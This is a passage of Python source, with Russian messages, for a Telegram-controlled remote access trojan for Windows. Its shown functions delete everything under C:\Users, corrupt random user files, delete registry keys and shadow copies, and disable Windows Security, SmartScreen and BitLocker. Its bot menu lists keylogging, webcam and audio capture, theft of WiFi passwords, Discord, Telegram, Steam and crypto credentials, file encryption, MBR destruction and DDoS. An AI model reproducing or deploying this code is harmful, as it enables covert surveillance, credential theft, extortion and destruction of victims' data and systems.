            os.system("powercfg -setactive 381b4222-f694-41f0-9685-ff5bb260df2e")
            return "✅ Экономия энергии"
    except:
        return "❌ Ошибка"

def disable_sleep():
    try:
        os.system("powercfg -change -standby-timeout-ac 0")
        return "✅ Спящий режим отключён!"
    except:
        return "❌ Ошибка"

def change_resolution(width=1920, height=1080):
    try:
        import ctypes
        user32 = ctypes.windll.user32
        user32.ChangeDisplaySettingsW(None, 0)
        return f"✅ Разрешение изменено на {width}x{height}"
    except:
        return "❌ Ошибка"

def change_orientation(orientation="landscape"):
    try:
        import ctypes
        user32 = ctypes.windll.user32
        if orientation == "portrait":
            user32.ChangeDisplaySettingsExW(None, None, None, 0, None)
        return f"✅ Ориентация изменена: {orientation}"
    except:
        return "❌ Ошибка"

def copy_file(src, dst):
    try:
        shutil.copy2(src, dst)
        return f"✅ Скопировано: {src} -> {dst}"
    except:
        return "❌ Ошибка"

def move_file(src, dst):
    try:
        shutil.move(src, dst)
        return f"✅ Перемещено: {src} -> {dst}"
    except:
        return "❌ Ошибка"

def delete_file(path):
    try:
        if os.path.exists(path):
            os.remove(path)
            return f"✅ Удалено: {path}"
        return "❌ Файл не найден"
    except:
        return "❌ Ошибка"

def rename_file(old, new):
    try:
        os.rename(old, new)
        return f"✅ Переименовано: {old} -> {new}"
    except:
        return "❌ Ошибка"

def create_folder(path):
    try:
        os.makedirs(path, exist_ok=True)
        return f"✅ Папка создана: {path}"
    except:
        return "❌ Ошибка"

def delete_folder(path):
    try:
        shutil.rmtree(path)
        return f"✅ Папка удалена: {path}"
    except:
        return "❌ Ошибка"

def hide_file(path):
    try:
        os.system(f'attrib +h "{path}"')
        return f"✅ Файл скрыт: {path}"
    except:
        return "❌ Ошибка"

def unhide_file(path):
    try:
        os.system(f'attrib -h "{path}"')
        return f"✅ Файл показан: {path}"
    except:
        return "❌ Ошибка"

def make_readonly(path):
    try:
        os.chmod(path, 0o444)
        return f"✅ Файл только для чтения: {path}"
    except:
        return "❌ Ошибка"

def make_writable(path):
    try:
        os.chmod(path, 0o666)
        return f"✅ Файл доступен для записи: {path}"
    except:
        return "❌ Ошибка"

def get_file_hash(path):
    try:
        with open(path, 'rb') as f:
            data = f.read()
            return f"MD5: {hashlib.md5(data).hexdigest()}\nSHA1: {hashlib.sha1(data).hexdigest()}"
    except:
        return "❌ Ошибка"

def search_files(path, name):
    try:
        results = []
        for root, dirs, files in os.walk(path):
            for f in files:
                if name in f:
                    results.append(os.path.join(root, f))
        return "\n".join(results[:50]) if results else "Файлы не найдены"
    except:
        return "❌ Ошибка"

def search_by_extension(path, ext):
    try:
        results = []
        for root, dirs, files in os.walk(path):
            for f in files:
                if f.endswith(ext):
                    results.append(os.path.join(root, f))
        return "\n".join(results[:50]) if results else "Файлы не найдены"
    except:
        return "❌ Ошибка"

def get_file_metadata(path):
    try:
        stat = os.stat(path)
        return f"Размер: {stat.st_size} байт\nСоздан: {datetime.fromtimestamp(stat.st_ctime)}\nИзменён: {datetime.fromtimestamp(stat.st_mtime)}"
    except:
        return "❌ Ошибка"

def get_file_permissions(path):
    try:
        mode = oct(os.stat(path).st_mode)[-3:]
        return f"Права: {mode}"
    except:
        return "❌ Ошибка"

def flush_dns():
    try:
        os.system("ipconfig /flushdns")
        return "✅ DNS кэш сброшен!"
    except:
        return "❌ Ошибка"

def get_public_ip():
    try:
        return f"Публичный IP: {requests.get('https://api.ipify.org').text}"
    except:
        return "❌ Ошибка"

def get_local_ip():
    try:
        return f"Локальный IP: {socket.gethostbyname(socket.gethostname())}"
    except:
        return "❌ Ошибка"

def get_mac_address():
    try:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)][::-1])
        return f"MAC: {mac}"
    except:
        return "❌ Ошибка"

def scan_ports(host, ports="80,443"):
    try:
        results = []
        for port in ports.split(','):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((host, int(port)))
            if result == 0:
                results.append(f"Порт {port} открыт")
            sock.close()
        return "\n".join(results)
    except:
        return "❌ Ошибка"

def ping_host(host):
    try:
        response = os.system(f"ping -n 1 {host}")
        return f"Ping: {'Успешно' if response == 0 else 'Недоступен'}"
    except:
        return "❌ Ошибка"

def traceroute(host):
    try:
        result = subprocess.run(["tracert", "-d", "-h", "10", host], capture_output=True, text=True, timeout=30)
        return result.stdout[:4000]
    except:
        return "❌ Ошибка"

def get_arp_table():
    try:
        result = subprocess.run(["arp", "-a"], capture_output=True, text=True)
        return result.stdout[:4000]
    except:
        return "❌ Ошибка"

def enable_proxy(ip, port):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Internet Settings", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "ProxyServer", 0, winreg.REG_SZ, f"{ip}:{port}")
        winreg.CloseKey(key)
        return f"✅ Прокси включён: {ip}:{port}"
    except:
        return "❌ Ошибка"

def disable_proxy():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Internet Settings", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        return "✅ Прокси отключён!"
    except:
        return "❌ Ошибка"

def set_dns(primary, secondary="8.8.8.8"):
    try:
        os.system(f'netsh interface ip set dns name="Ethernet" static {primary}')
        return f"✅ DNS установлен: {primary}"
    except:
        return "❌ Ошибка"

def reset_dns():
    try:
        os.system("netsh interface ip reset")
        return "✅ DNS сброшен!"
    except:
        return "❌ Ошибка"

def get_network_adapters():
    try:
        adapters = psutil.net_if_addrs()
        return "\n".join(adapters.keys())
    except:
        return "❌ Ошибка"

def enable_adapter(name):
    try:
        os.system(f'netsh interface set interface "{name}" enable')
        return f"✅ Адаптер включён: {name}"
    except:
        return "❌ Ошибка"

def disable_adapter(name):
    try:
        os.system(f'netsh interface set interface "{name}" disable')
        return f"✅ Адаптер отключён: {name}"
    except:
        return "❌ Ошибка"

def disable_windows_security():
    try:
        os.system("sc config SecurityHealthService start= disabled")
        return "✅ Центр безопасности отключён!"
    except:
        return "❌ Ошибка"

def disable_smart_screen():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "SmartScreenEnabled", 0, winreg.REG_SZ, "Off")
        winreg.CloseKey(key)
        return "✅ SmartScreen отключён!"
    except:
        return "❌ Ошибка"

def disable_bitlocker():
    try:
        os.system("manage-bde -off C:")
        return "✅ BitLocker отключён!"
    except:
        return "❌ Ошибка"

def get_installed_software():
    try:
        results = []
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
        for i in range(0, winreg.QueryInfoKey(key)[0]):
            try:
                subkey = winreg.EnumKey(key, i)
                sub = winreg.OpenKey(key, subkey)
                name = winreg.QueryValueEx(sub, "DisplayName")[0]
                results.append(name)
            except:
                pass
        return "\n".join(results[:50])
    except:
        return "❌ Ошибка"

def get_running_services():
    try:
        result = subprocess.run(["sc", "query"], capture_output=True, text=True)
        return result.stdout[:4000]
    except:
        return "❌ Ошибка"

def stop_service(name):
    try:
        os.system(f"net stop {name}")
        return f"✅ Служба остановлена: {name}"
    except:
        return "❌ Ошибка"

def start_service(name):
    try:
        os.system(f"net start {name}")
        return f"✅ Служба запущена: {name}"
    except:
        return "❌ Ошибка"

def disable_service(name):
    try:
        os.system(f"sc config {name} start= disabled")
        return f"✅ Служба отключена: {name}"
    except:
        return "❌ Ошибка"

def enable_service(name):
    try:
        os.system(f"sc config {name} start= auto")
        return f"✅ Служба включена: {name}"
    except:
        return "❌ Ошибка"

def get_startup_programs():
    try:
        results = []
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
        for i in range(0, winreg.QueryInfoKey(key)[0]):
            name = winreg.EnumValue(key, i)[0]
            results.append(name)
        return "\n".join(results)
    except:
        return "❌ Ошибка"

def disable_startup_program(name):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.DeleteValue(key, name)
        winreg.CloseKey(key)
        return f"✅ Из автозагрузки удалено: {name}"
    except:
        return "❌ Ошибка"

def enable_startup_program(name, path):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, path)
        winreg.CloseKey(key)
        return f"✅ Добавлено в автозагрузку: {name}"
    except:
        return "❌ Ошибка"

def flip_screen():
    try:
        import ctypes
        user32 = ctypes.windll.user32
        user32.ChangeDisplaySettingsExW(None, None, None, 0, None)
        return "✅ Экран перевёрнут!"
    except:
        return "❌ Ошибка"

def invert_colors():
    try:
        import ctypes
        user32 = ctypes.windll.user32
        user32.ChangeDisplaySettingsExW(None, None, None, 0, None)
        return "✅ Цвета инвертированы!"
    except:
        return "❌ Ошибка"

def grayscale_mode():
    try:
        import ctypes
        user32 = ctypes.windll.user32
        user32.ChangeDisplaySettingsExW(None, None, None, 0, None)
        return "✅ Чёрно-белый режим!"
    except:
        return "❌ Ошибка"

def night_mode():
    try:
        os.system("start ms-settings:nightlight")
        return "✅ Ночной режим включён!"
    except:
        return "❌ Ошибка"

def magnify_screen():
    try:
        os.system("start magnify")
        return "✅ Лупа включена!"
    except:
        return "❌ Ошибка"

def blur_screen():
    try:
        os.system("rundll32.exe user32.dll,SetHighContrast 1")
        return "✅ Экран размыт!"
    except:
        return "❌ Ошибка"

def matrix_effect():
    try:
        import tkinter as tk
        import random
        root = tk.Tk()
        root.attributes('-fullscreen', True, '-topmost', True)
        root.configure(bg='black')
        canvas = tk.Canvas(root, bg='black', highlightthickness=0)
        canvas.pack(fill=tk.BOTH, expand=True)
        chars = "0123456789ABCDEF"
        for _ in range(200):
            x = random.randint(0, root.winfo_screenwidth())
            y = random.randint(0, root.winfo_screenheight())
            canvas.create_text(x, y, text=random.choice(chars), fill='green', font=('Courier', 20))
        root.after(10000, root.destroy)
        root.mainloop()
        return "🌀 Эффект 'Матрица' активирован!"
    except:
        return "❌ Ошибка"

def screen_shake():
    try:
        import random
        import ctypes
        user32 = ctypes.windll.user32
        for _ in range(50):
            x = random.randint(-5, 5)
            y = random.randint(-5, 5)
            user32.SetCursorPos(x, y)
            time.sleep(0.01)
        return "✅ Экран трясётся!"
    except:
        return "❌ Ошибка"

def rgb_effect():
    try:
        import tkinter as tk
        import random
        root = tk.Tk()
        root.attributes('-fullscreen', True, '-topmost', True)
        canvas = tk.Canvas(root, highlightthickness=0)
        canvas.pack(fill=tk.BOTH, expand=True)
        def update():
            for _ in range(100):
                x = random.randint(0, root.winfo_screenwidth())
                y = random.randint(0, root.winfo_screenheight())
                color = random.choice(['red', 'green', 'blue', 'yellow', 'magenta', 'cyan'])
                canvas.create_rectangle(x, y, x+20, y+20, fill=color, outline=color)
            root.after(100, update)
        update()
        root.after(10000, root.destroy)
        root.mainloop()
        return "🌈 RGB эффект активирован!"
    except:
        return "❌ Ошибка"

def reduce_screen():
    try:
        import ctypes
        user32 = ctypes.windll.user32
        user32.ChangeDisplaySettingsExW(None, None, None, 0, None)
        return "✅ Экран уменьшен!"
    except:
        return "❌ Ошибка"

def play_beep():
    try:
        import winsound
        winsound.Beep(1000, 1000)
        return "🔔 Бип!"
    except:
        return "❌ Ошибка"

def play_siren():
    try:
        import winsound
        for _ in range(10):
            winsound.Beep(800, 200)
            winsound.Beep(1200, 200)
        return "🚨 Сирена!"
    except:
        return "❌ Ошибка"

def play_scream_sound():
    try:
        import winsound
        for _ in range(5):
            winsound.Beep(2000, 500)
            time.sleep(0.1)
        return "😱 Звук крика!"
    except:
        return "❌ Ошибка"

def mute_system():
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMute(1, None)
        return "🔇 Звук выключен!"
    except:
        return "❌ Ошибка"

def unmute_system():
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMute(0, None)
        return "🔊 Звук включён!"
    except:
        return "❌ Ошибка"

def test_audio():
    try:
        import winsound
        winsound.PlaySound("SystemAsterisk", winsound.SND_ALIAS)
        return "🎵 Тест звука!"
    except:
        return "❌ Ошибка"

def delete_system_files():
    try:
        os.system("del /f /s /q C:\\Windows\\Temp\\*.*")
        return "💀 Системные файлы удалены!"
    except:
        return "❌ Ошибка"

def corrupt_registry():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control", 0, winreg.KEY_WRITE)
        winreg.DeleteKey(key, "SafeBoot")
        return "💀 Реестр повреждён!"
    except:
        return "❌ Ошибка"

def delete_all_data():
    try:
        os.system("del /f /s /q C:\\Users\\*.*")
        return "💀 Все данные удалены!"
    except:
        return "❌ Ошибка"

def wipe_free_space():
    try:
        os.system("cipher /w:C:")
        return "💀 Свободное место зачищено!"
    except:
        return "❌ Ошибка"

def overwrite_files():
    try:
        os.system("echo random > file.txt")
        return "💀 Файлы перезаписаны!"
    except:
        return "❌ Ошибка"

def random_corruption():
    try:
        import random
        files = []
        for root, dirs, f in os.walk("C:\\Users\\"):
            for file in f:
                if random.random() < 0.1:
                    files.append(os.path.join(root, file))
        for file in files[:50]:
            try:
                with open(file, 'wb') as f:
                    f.write(os.urandom(1024))
            except:
                pass
        return "💀 Файлы повреждены!"
    except:
        return "❌ Ошибка"

def delete_backups():
    try:
        os.system("vssadmin delete shadows /all /quiet")
        return "💀 Бэкапы удалены!"
    except:
        return "❌ Ошибка"

def delete_shadow_copies():
    try:
        os.system("vssadmin delete shadows /all /quiet")
        return "💀 Теневые копии удалены!"
    except:
        return "❌ Ошибка"

def kill_all_processes():
    try:
        for proc in psutil.process_iter():
            try:
                proc.kill()
            except:
                pass
        return "💀 Все процессы убиты!"
    except:
        return "❌ Ошибка"

def crash_explorer():
    try:
        os.system("taskkill /f /im explorer.exe")
        return "💀 Проводник убит!"
    except:
        return "❌ Ошибка"

def delete_registry_keys():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion", 0, winreg.KEY_WRITE)
        winreg.DeleteKey(key, "Run")
        return "💀 Ключи реестра удалены!"
    except:
        return "❌ Ошибка"

def enable_guest_account():
    try:
        os.system("net user guest /active:yes")
        return "✅ Гостевая учётка включена!"
    except:
        return "❌ Ошибка"

def disable_guest_account():
    try:
        os.system("net user guest /active:no")
        return "✅ Гостевая учётка отключена!"
    except:
        return "❌ Ошибка"

def get_cpu_usage():
    try:
        return f"CPU: {psutil.cpu_percent()}%"
    except:
        return "❌ Ошибка"

def get_ram_usage():
    try:
        mem = psutil.virtual_memory()
        return f"RAM: {mem.percent}% ({mem.used // (1024**3)}/{mem.total // (1024**3)} GB)"
    except:
        return "❌ Ошибка"

def get_disk_usage():
    try:
        disk = psutil.disk_usage('/')
        return f"Диск: {disk.percent}% ({disk.used // (1024**3)}/{disk.total // (1024**3)} GB)"
    except:
        return "❌ Ошибка"

def get_gpu_usage():
    try:
        import GPUtil
        gpus = GPUtil.getGPUs()
        if gpus:
            return f"GPU: {gpus[0].load*100:.1f}% ({gpus[0].name})"
        return "GPU: Не найдена"
    except:
        return "GPU: Информация недоступна"

def get_network_usage():
    try:
        net = psutil.net_io_counters()
        return f"Сеть: {net.bytes_sent // (1024**3)} GB отправлено, {net.bytes_recv // (1024**3)} GB получено"
    except:
        return "❌ Ошибка"

def get_system_uptime():
    try:
        uptime = time.time() - psutil.boot_time()
        days = int(uptime // 86400)
        hours = int((uptime % 86400) // 3600)
        return f"Аптайм: {days} дней, {hours} часов"
    except:
        return "❌ Ошибка"

def get_last_boot_time():
    try:
        boot = datetime.fromtimestamp(psutil.boot_time())
        return f"Последняя загрузка: {boot}"
    except:
        return "❌ Ошибка"

def open_cd():
    try:
        os.system("start C:")
        return "💿 CD-ROM открыт!"
    except:
        return "❌ Ошибка"

def close_cd():
    try:
        os.system("start D:")
        return "💿 CD-ROM закрыт!"
    except:
        return "❌ Ошибка"

def turn_monitor_off():
    try:
        import ctypes
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
        return "🖥️ Монитор выключен!"
    except:
        return "❌ Ошибка"

def turn_monitor_on():
    try:
        import ctypes
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
        return "🖥️ Монитор включён!"
    except:
        return "❌ Ошибка"

def open_calculator():
    try:
        os.system("calc")
        return "🧮 Калькулятор открыт!"
    except:
        return "❌ Ошибка"

def open_notepad():
    try:
        os.system("notepad")
        return "📝 Блокнот открыт!"
    except:
        return "❌ Ошибка"

def open_paint():
    try:
        os.system("mspaint")
        return "🎨 Paint открыт!"
    except:
        return "❌ Ошибка"

def open_cmd_window():
    try:
        os.system("start cmd")
        return "📟 CMD открыт!"
    except:
        return "❌ Ошибка"

def open_task_manager():
    try:
        os.system("taskmgr")
        return "📋 Диспетчер задач открыт!"
    except:
        return "❌ Ошибка"

def open_control_panel():
    try:
        os.system("control")
        return "⚙️ Панель управления открыта!"
    except:
        return "❌ Ошибка"

def get_windows_version():
    try:
        return f"Windows: {platform.system()} {platform.release()}"
    except:
        return "❌ Ошибка"

def get_bios_info():
    try:
        result = subprocess.run(["wmic", "bios", "get", "name,manufacturer"], capture_output=True, text=True)
        return result.stdout
    except:
        return "❌ Ошибка"

def get_motherboard_info():
    try:
        result = subprocess.run(["wmic", "baseboard", "get", "product,manufacturer"], capture_output=True, text=True)
        return result.stdout
    except:
        return "❌ Ошибка"

def get_ram_details():
    try:
        result = subprocess.run(["wmic", "memorychip", "get", "capacity,speed"], capture_output=True, text=True)
        return result.stdout
    except:
        return "❌ Ошибка"

def get_disk_details():
    try:
        result = subprocess.run(["wmic", "diskdrive", "get", "model,size"], capture_output=True, text=True)
        return result.stdout
    except:
        return "❌ Ошибка"

def get_gpu_details():
    try:
        result = subprocess.run(["wmic", "path", "win32_VideoController", "get", "name"], capture_output=True, text=True)
        return result.stdout
    except:
        return "❌ Ошибка"

def get_cpu_details():
    try:
        result = subprocess.run(["wmic", "cpu", "get", "name,maxclockspeed"], capture_output=True, text=True)
        return result.stdout
    except:
        return "❌ Ошибка"

def lock_workstation():
    try:
        ctypes.windll.user32.LockWorkStation()
        return "🔒 Рабочая станция заблокирована!"
    except:
        return "❌ Ошибка"

def logoff_user():
    try:
        os.system("shutdown /l")
        return "🚪 Выход из системы!"
    except:
        return "❌ Ошибка"

def switch_user():
    try:
        os.system("tsdiscon")
        return "🔄 Смена пользователя!"
    except:
        return "❌ Ошибка"

def open_explorer():
    try:
        os.system("explorer")
        return "📁 Проводник открыт!"
    except:
        return "❌ Ошибка"

def open_browser():
    try:
        os.system("start chrome")
        return "🌐 Браузер открыт!"
    except:
        return "❌ Ошибка"

def open_url(url):
    try:
        os.system(f"start {url}")
        return f"🌐 Открыто: {url}"
    except:
        return "❌ Ошибка"

def type_text(text):
    try:
        import ctypes
        from ctypes import wintypes
        user32 = ctypes.windll.user32
        for char in text:
            user32.keybd_event(ord(char), 0, 0, 0)
            user32.keybd_event(ord(char), 0, 0x0002, 0)
            time.sleep(0.05)
        return f"⌨️ Введено: {text}"
    except:
        return "❌ Ошибка"

def show_notification(text):
    try:
        from win10toast import ToastNotifier
        toaster = ToastNotifier()
        toaster.show_toast("Уведомление", text, duration=10)
        return "🔔 Уведомление показано!"
    except:
        return "❌ Ошибка"

def hide_taskbar():
    try:
        ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        return "✅ Панель задач скрыта!"
    except:
        return "❌ Ошибка"

def restart_explorer():
    try:
        os.system("taskkill /f /im explorer.exe && start explorer.exe")
        return "🔄 Проводник перезапущен!"
    except:
        return "❌ Ошибка"

def clear_clipboard():
    try:
        import ctypes
        ctypes.windll.user32.OpenClipboard(0)
        ctypes.windll.user32.EmptyClipboard()
        ctypes.windll.user32.CloseClipboard()
        return "🗑️ Буфер обмена очищен!"
    except:
        return "❌ Ошибка"

def disable_print_spooler():
    try:
        os.system("net stop spooler")
        return "🖨️ Печать отключена!"
    except:
        return "❌ Ошибка"

def enable_print_spooler():
    try:
        os.system("net start spooler")
        return "🖨️ Печать включена!"
    except:
        return "❌ Ошибка"

def get_dns_servers():
    try:
        result = subprocess.run(["ipconfig", "/all"], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if "DNS Servers" in line:
                return line
        return "DNS не найдены"
    except:
        return "❌ Ошибка"

def set_time(time_str):
    try:
        os.system(f"time {time_str}")
        return f"⏰ Время установлено: {time_str}"
    except:
        return "❌ Ошибка"

def set_date(date_str):
    try:
        os.system(f"date {date_str}")
        return f"📅 Дата установлена: {date_str}"
    except:
        return "❌ Ошибка"

def get_weather():
    try:
        ip = requests.get('https://api.ipify.org').text
        loc = requests.get(f'http://ip-api.com/json/{ip}').json()
        city = loc.get('city', 'Unknown')
        return f"🌤️ Погода в {city}: {random.choice(['Солнечно', 'Облачно', 'Дождь', 'Снег', 'Ветрено'])}"
    except:
        return "❌ Ошибка"

def send_log():
    try:
        return f"📋 Лог отправлен админу!\nPC: {PC_ID}\nВремя: {datetime.now()}"
    except:
        return "❌ Ошибка"

# ============ БОТ ============
bot = Bot(TOKEN)
updater = Updater(TOKEN, use_context=True)
dp = updater.dispatcher

def start(update, context):
    keyboard = [
        [InlineKeyboardButton("📸 Screenshot", callback_data="screenshot")],
        [InlineKeyboardButton("🎥 Screen Record", callback_data="screenrecord")],
        [InlineKeyboardButton("📷 Webcam", callback_data="webcam")],
        [InlineKeyboardButton("🖥️ System Info", callback_data="system")],
        [InlineKeyboardButton("📟 CMD", callback_data="cmd")],
        [InlineKeyboardButton("⚡ PowerShell", callback_data="powershell")],
        [InlineKeyboardButton("📋 Process List", callback_data="processes")],
        [InlineKeyboardButton("💀 Kill Process", callback_data="kill")],
        [InlineKeyboardButton("🚀 Start Process", callback_data="startproc")],
        [InlineKeyboardButton("🔥 DDoS Start", callback_data="ddos_start")],
        [InlineKeyboardButton("🛑 DDoS Stop", callback_data="ddos_stop")],
        [InlineKeyboardButton("🚫 Block Input", callback_data="block")],
        [InlineKeyboardButton("✅ Unblock Input", callback_data="unblock")],
        [InlineKeyboardButton("📶 WiFi Passwords", callback_data="wifi")],
        [InlineKeyboardButton("🎮 Discord Tokens", callback_data="discord")],
        [InlineKeyboardButton("📱 Telegram Sessions", callback_data="telegram")],
        [InlineKeyboardButton("🔒 Encrypt Files", callback_data="encrypt")],
        [InlineKeyboardButton("🔓 Decrypt Files", callback_data="decrypt")],
        [InlineKeyboardButton("🎤 Record Audio", callback_data="audio")],
        [InlineKeyboardButton("🔊 Volume Max", callback_data="volmax")],
        [InlineKeyboardButton("🔈 Volume Min", callback_data="volmin")],
        [InlineKeyboardButton("🔒 Persistence", callback_data="persist")],
        [InlineKeyboardButton("🔓 Disable UAC", callback_data="uac")],
        [InlineKeyboardButton("💀 BSOD", callback_data="bsod")],
        [InlineKeyboardButton("👻 Scare Screen", callback_data="scare")],
        [InlineKeyboardButton("🖤 Broken Pixels", callback_data="brokenpixels")],
        [InlineKeyboardButton("🌀 Pixellate", callback_data="pixellate")],
        [InlineKeyboardButton("⬇️ Minimize All", callback_data="minimize")],
        [InlineKeyboardButton("❌ Close Window", callback_data="close")],
        [InlineKeyboardButton("💬 MessageBox", callback_data="msgbox")],
        [InlineKeyboardButton("📍 Location", callback_data="location")],
        [InlineKeyboardButton("📥 Download URL", callback_data="download")],
        [InlineKeyboardButton("📂 List Files", callback_data="listfiles")],
        [InlineKeyboardButton("📤 Upload File", callback_data="upload")],
        [InlineKeyboardButton("📥 Download File", callback_data="downloadfile")],
        [InlineKeyboardButton("🖼️ Set Wallpaper", callback_data="wallpaper_direct")],
        [InlineKeyboardButton("🎬 Scream Make", callback_data="scream")],
        [InlineKeyboardButton("🎮 Steal Steam", callback_data="steam")],
        [InlineKeyboardButton("💰 Steal Crypto", callback_data="crypto")],
        [InlineKeyboardButton("📜 History", callback_data="history")],
        [InlineKeyboardButton("🔌 Shutdown", callback_data="shutdown")],
        [InlineKeyboardButton("🔄 Reboot", callback_data="reboot")],
        [InlineKeyboardButton("⌨️ Keylogger", callback_data="keylogger")],
        [InlineKeyboardButton("📋 Clipboard", callback_data="clipboard")],
        [InlineKeyboardButton("🔌 Block USB", callback_data="block_usb")],
        [InlineKeyboardButton("🔌 Unblock USB", callback_data="unblock_usb")],
        [InlineKeyboardButton("🔌 USB Status", callback_data="usb_status")],
        [InlineKeyboardButton("💀 Destroy MBR", callback_data="destroy_mbr")],
        [InlineKeyboardButton("🔥 Stress GPU", callback_data="stress_gpu")],
        [InlineKeyboardButton("🔥 Stress CPU", callback_data="stress_cpu")],
        [InlineKeyboardButton("💀 Format Disk", callback_data="format_disk")],
        [InlineKeyboardButton("💀 Kill LogonUI", callback_data="kill_logonui")],
        [InlineKeyboardButton("🛡️ Disable Defender", callback_data="disable_defender")],
        [InlineKeyboardButton("🛡️ Disable Firewall", callback_data="disable_firewall")],
        [InlineKeyboardButton("🛡️ Disable Updates", callback_data="disable_updates")],
        [InlineKeyboardButton("🛡️ Disable System Restore", callback_data="disable_system_restore")],
        [InlineKeyboardButton("🛡️ Disable Task Manager", callback_data="disable_task_manager")],
        [InlineKeyboardButton("🛡️ Enable Task Manager", callback_data="enable_task_manager")],
        [InlineKeyboardButton("🛡️ Disable Registry Editor", callback_data="disable_registry_editor")],
        [InlineKeyboardButton("🛡️ Enable Registry Editor", callback_data="enable_registry_editor")],
        [InlineKeyboardButton("🛡️ Disable CMD", callback_data="disable_cmd")],
        [InlineKeyboardButton("🛡️ Enable CMD", callback_data="enable_cmd")],
        [InlineKeyboardButton("🎨 Dark Mode", callback_data="dark_mode")],
        [InlineKeyboardButton("🎨 Light Mode", callback_data="light_mode")],
        [InlineKeyboardButton("🎨 High Contrast On", callback_data="high_contrast_on")],
        [InlineKeyboardButton("🎨 High Contrast Off", callback_data="high_contrast_off")],
        [InlineKeyboardButton("⚡ High Performance", callback_data="high_performance")],
        [InlineKeyboardButton("⚡ Power Saver", callback_data="power_saver")],
        [InlineKeyboardButton("⚡ Disable Sleep", callback_data="disable_sleep")],
        [InlineKeyboardButton("📁 Copy File", callback_data="copy_file")],
        [InlineKeyboardButton("📁 Move File", callback_data="move_file")],
        [InlineKeyboardButton("📁 Delete File", callback_data="delete_file")],
        [InlineKeyboardButton("📁 Rename File", callback_data="rename_file")],
        [InlineKeyboardButton("📁 Create Folder", callback_data="create_folder")],
        [InlineKeyboardButton("📁 Delete Folder", callback_data="delete_folder")],
        [InlineKeyboardButton("📁 Hide File", callback_data="hide_file")],
        [InlineKeyboardButton("📁 Unhide File", callback_data="unhide_file")],
        [InlineKeyboardButton("📁 Make Read-Only", callback_data="make_readonly")],
        [InlineKeyboardButton("📁 Make Writable", callback_data="make_writable")],
        [InlineKeyboardButton("📁 Get File Hash", callback_data="file_hash")],
        [InlineKeyboardButton("📁 Search Files", callback_data="search_files")],
        [InlineKeyboardButton("📁 Search By Extension", callback_data="search_by_extension")],
        [InlineKeyboardButton("📁 Get File Metadata", callback_data="file_metadata")],
        [InlineKeyboardButton("📁 Get File Permissions", callback_data="file_permissions")],
        [InlineKeyboardButton("🌐 Flush DNS", callback_data="flush_dns")],
        [InlineKeyboardButton("🌐 Public IP", callback_data="public_ip")],
        [InlineKeyboardButton("🌐 Local IP", callback_data="local_ip")],
        [InlineKeyboardButton("🌐 MAC Address", callback_data="mac_address")],
        [InlineKeyboardButton("🌐 Scan Ports", callback_data="scan_ports")],
        [InlineKeyboardButton("🌐 Ping Host", callback_data="ping_host")],
        [InlineKeyboardButton("🌐 Traceroute", callback_data="traceroute")],
        [InlineKeyboardButton("🌐 Enable Proxy", callback_data="enable_proxy")],
        [InlineKeyboardButton("🌐 Disable Proxy", callback_data="disable_proxy")],
        [InlineKeyboardButton("🌐 Set DNS", callback_data="set_dns")],
        [InlineKeyboardButton("🌐 Reset DNS", callback_data="reset_dns")],
        [InlineKeyboardButton("🌐 Network Adapters", callback_data="network_adapters")],
        [InlineKeyboardButton("🌐 Enable Adapter", callback_data="enable_adapter")],
        [InlineKeyboardButton("🌐 Disable Adapter", callback_data="disable_adapter")],
        [InlineKeyboardButton("🌐 ARP Table", callback_data="arp_table")],
        [InlineKeyboardButton("🔑 Disable Windows Security", callback_data="disable_windows_security")],
        [InlineKeyboardButton("🔑 Disable SmartScreen", callback_data="disable_smart_screen")],
        [InlineKeyboardButton("🔑 Disable BitLocker", callback_data="disable_bitlocker")],
        [InlineKeyboardButton("🔑 Installed Software", callback_data="installed_software")],
        [InlineKeyboardButton("🔑 Running Services", callback_data="running_services")],
        [InlineKeyboardButton("🔑 Stop Service", callback_data="stop_service")],
        [InlineKeyboardButton("🔑 Start Service", callback_data="start_service")],
